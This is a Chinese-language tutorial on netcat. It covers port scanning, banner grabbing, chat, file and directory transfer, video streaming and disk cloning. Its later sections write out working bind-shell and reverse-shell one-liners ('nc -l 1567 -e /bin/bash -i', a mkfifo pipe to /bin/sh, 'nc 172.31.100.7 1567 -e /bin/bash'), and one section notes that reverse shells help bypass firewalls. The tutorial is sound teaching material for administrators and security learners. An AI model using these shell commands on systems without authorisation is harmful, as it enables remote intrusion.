

# Linux netcat/nc命令的使用

## 1，端口扫描
端口扫描经常被系统管理员和黑客用来发现在一些机器上开放的端口，帮助他们识别系统中的漏洞。

`$nc -z -v -n 172.31.100.7 21-25`
可以运行在TCP或者UDP模式，默认是TCP，-u参数调整为udp.
z 参数告诉netcat使用0 IO,连接成功后立即关闭连接， 不进行数据交换(谢谢@jxing 指点)

v 参数指使用冗余选项（译者注：即详细输出）

n 参数告诉netcat 不要使用DNS反向查询IP地址的域名

这个命令会打印21到25 所有开放的端口。Banner是一个文本，Banner是一个你连接的服务发送给你的文本信息。当你试图鉴别漏洞或者服务的类型和版本的时候，Banner信息是非常有用的。但是，并不是所有的服务都会发送banner。

一旦你发现开放的端口，你可以容易的使用netcat 连接服务抓取他们的banner。

`$ nc -v 172.31.100.7 21`
netcat 命令会连接开放端口21并且打印运行在这个端口上服务的banner信息。

使用netcat查看本机1-100号TCP和UDP端口开启情况：
```
[Tue Nov 16 14:56:21~]$ netcat -zvn 127.0.0.1 1-100
netcat: connect to 127.0.0.1 port 1 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 2 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 3 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 4 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 5 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 6 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 7 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 8 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 9 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 10 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 11 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 12 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 13 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 14 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 15 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 16 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 17 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 18 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 19 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 20 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 21 (tcp) failed: Connection refused
Connection to 127.0.0.1 22 port [tcp/*] succeeded!
netcat: connect to 127.0.0.1 port 23 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 24 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 25 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 26 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 27 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 28 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 29 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 30 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 31 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 32 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 33 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 34 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 35 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 36 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 37 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 38 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 39 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 40 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 41 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 42 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 43 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 44 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 45 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 46 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 47 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 48 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 49 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 50 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 51 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 52 (tcp) failed: Connection refused
Connection to 127.0.0.1 53 port [tcp/*] succeeded!
netcat: connect to 127.0.0.1 port 54 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 55 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 56 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 57 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 58 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 59 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 60 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 61 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 62 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 63 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 64 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 65 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 66 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 67 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 68 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 69 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 70 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 71 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 72 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 73 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 74 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 75 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 76 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 77 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 78 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 79 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 80 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 81 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 82 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 83 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 84 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 85 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 86 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 87 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 88 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 89 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 90 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 91 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 92 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 93 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 94 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 95 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 96 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 97 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 98 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 99 (tcp) failed: Connection refused
netcat: connect to 127.0.0.1 port 100 (tcp) failed: Connection refused
[Tue Nov 16 14:56:42~]$ netcat -uzvn 127.0.0.1 1-100
Connection to 127.0.0.1 53 port [udp/*] succeeded!
[Tue Nov 16 14:57:00~]$ ^C

```

## Chat Server
假如你想和你的朋友聊聊，有很多的软件和信息服务可以供你使用。但是，如果你没有这么奢侈的配置，比如你在计算机实验室，所有的对外的连接都是被限制的，你怎样和整天坐在隔壁房间的朋友沟通那？不要郁闷了，netcat提供了这样一种方法，你只需要创建一个Chat服务器，一个预先确定好的端口，这样子他就可以联系到你了。
Server
`$nc -l 1567`
netcat 命令在1567端口启动了一个tcp 服务器，所有的标准输出和输入会输出到该端口。输出和输入都在此shell中展示。
Client
`$nc 172.31.100.7 1567`
不管你在机器B上键入什么都会出现在机器A上。

## 文件传输
大部分时间中，我们都在试图通过网络或者其他工具传输文件。有很多种方法，比如FTP,SCP,SMB等等，但是当你只是需要临时或者一次传输文件，真的值得浪费时间来安装配置一个软件到你的机器上嘛。假设，你想要传一个文件file.txt 从A 到B。A或者B都可以作为服务器或者客户端，以下，让A作为服务器，B为客户端。
Server
`$nc -l 1567 < file.txt`
Client
`$nc -n 172.31.100.7 1567 > file.txt`
这里我们创建了一个服务器在A上并且重定向netcat的输入为文件file.txt，那么当任何成功连接到该端口，netcat会发送file的文件内容。
在客户端我们重定向输出到file.txt，当B连接到A，A发送文件内容，B保存文件内容到file.txt.
没有必要创建文件源作为Server，我们也可以相反的方法使用。像下面的我们发送文件从B到A，但是服务器创建在A上，这次我们仅需要重定向netcat的输出并且重定向B的输入文件。
B作为Server
Server
`$nc -l 1567 > file.txt`
Client
`nc 172.31.100.23 1567 < file.txt`

## 目录传输
发送一个文件很简单，但是如果我们想要发送多个文件，或者整个目录，一样很简单，只需要使用压缩工具tar，压缩后发送压缩包。
如果你想要通过网络传输一个目录从A到B。
Server
`$tar -cvf – dir_name | nc -l 1567`
Client
`$nc -n 172.31.100.7 1567 | tar -xvf -`
这里在A服务器上，我们创建一个tar归档包并且通过-在控制台重定向它，然后使用管道，重定向给netcat，netcat可以通过网络发送它。
在客户端我们下载该压缩包通过netcat 管道然后打开文件。
如果想要节省带宽传输压缩包，我们可以使用bzip2或者其他工具压缩。
Server
`$tar -cvf – dir_name| bzip2 -z | nc -l 1567`
通过bzip2压缩
Client
`$nc -n 172.31.100.7 1567 | bzip2 -d |tar -xvf -`
使用bzip2解压

## 加密你通过网络发送的数据
如果你担心你在网络上发送数据的安全，你可以在发送你的数据之前用如mcrypt的工具加密。
服务端
`$nc localhost 1567 | mcrypt –flush –bare -F -q -d -m ecb > file.txt`
使用mcrypt工具加密数据。
客户端
`$mcrypt –flush –bare -F -q -m ecb < file.txt | nc -l 1567`
使用mcrypt工具解密数据。
以上两个命令会提示需要密码，确保两端使用相同的密码。

这里我们是使用mcrypt用来加密，使用其它任意加密工具都可以。

## 流视频
虽然不是生成流视频的最好方法，但如果服务器上没有特定的工具，使用netcat，我们仍然有希望做成这件事。
服务端
`$cat video.avi | nc -l 1567`
这里我们只是从一个视频文件中读入并重定向输出到netcat客户端
`$nc 172.31.100.7 1567 | mplayer -vo x11 -cache 3000 -`
这里我们从socket中读入数据并重定向到mplayer。

## 克隆一个设备
如果你已经安装配置一台Linux机器并且需要重复同样的操作对其他的机器，而你不想在重复配置一遍。不在需要重复配置安装的过程，只启动另一台机器的一些引导可以随身碟和克隆你的机器。
克隆Linux PC很简单，假如你的系统在磁盘/dev/sda上
Server
`$dd if=/dev/sda | nc -l 1567`
Client
`$nc -n 172.31.100.7 1567 | dd of=/dev/sda`
dd是一个从磁盘读取原始数据的工具，我通过netcat服务器重定向它的输出流到其他机器并且写入到磁盘中，它会随着分区表拷贝所有的信息。但是如果我们已经做过分区并且只需要克隆root分区，我们可以根据我们系统root分区的位置，更改sda 为sda1，sda2.等等。

## 打开一个shell
我们已经用过远程shell-使用telnet和ssh，但是如果这两个命令没有安装并且我们没有权限安装他们，我们也可以使用netcat创建远程shell。
假设你的netcat支持 -c -e 参数(默认 netcat)
Server
`$nc -l 1567 -e /bin/bash -i`
Client
`$nc 172.31.100.7 1567`
这里我们已经创建了一个netcat服务器并且表示当它连接成功时执行/bin/bash
假如netcat 不支持-c 或者 -e 参数（openbsd netcat）,我们仍然能够创建远程shell
Server
`$mkfifo /tmp/tmp_fifo`
`$cat /tmp/tmp_fifo | /bin/sh -i 2>&1 | nc -l 1567 > /tmp/tmp_fifo`
这里我们创建了一个fifo文件，然后使用管道命令把这个fifo文件内容定向到shell 2>&1中。是用来重定向标准错误输出和标准输出，然后管道到netcat 运行的端口1567上。至此，我们已经把netcat的输出重定向到fifo文件中。
说明：
从网络收到的输入写到fifo文件中
cat 命令读取fifo文件并且其内容发送给sh命令
sh命令进程受到输入并把它写回到netcat。
netcat 通过网络发送输出到client
至于为什么会成功是因为管道使命令平行执行，fifo文件用来替代正常文件，因为fifo使读取等待而如果是一个普通文件，cat命令会尽快结束并开始读取空文件。
在客户端仅仅简单连接到服务器
Client
`$nc -n 172.31.100.7 1567`
你会得到一个shell提示符在客户端

## 反向shell
反向shell是指在客户端打开的shell。反向shell这样命名是因为不同于其他配置，这里服务器使用的是由客户提供的服务。

服务端

`$nc -l 1567`
在客户端，简单地告诉netcat在连接完成后，执行shell。
客户端

`$nc 172.31.100.7 1567 -e /bin/bash`
现在，什么是反向shell的特别之处呢 
 反向shell经常被用来绕过防火墙的限制，如阻止入站连接。例如，我有一个专用IP地址为172.31.100.7，我使用代理服务器连接到外部网络。如果我想从网络外部访问 这台机器如1.2.3.4的shell，那么我会用反向外壳用于这一目的。 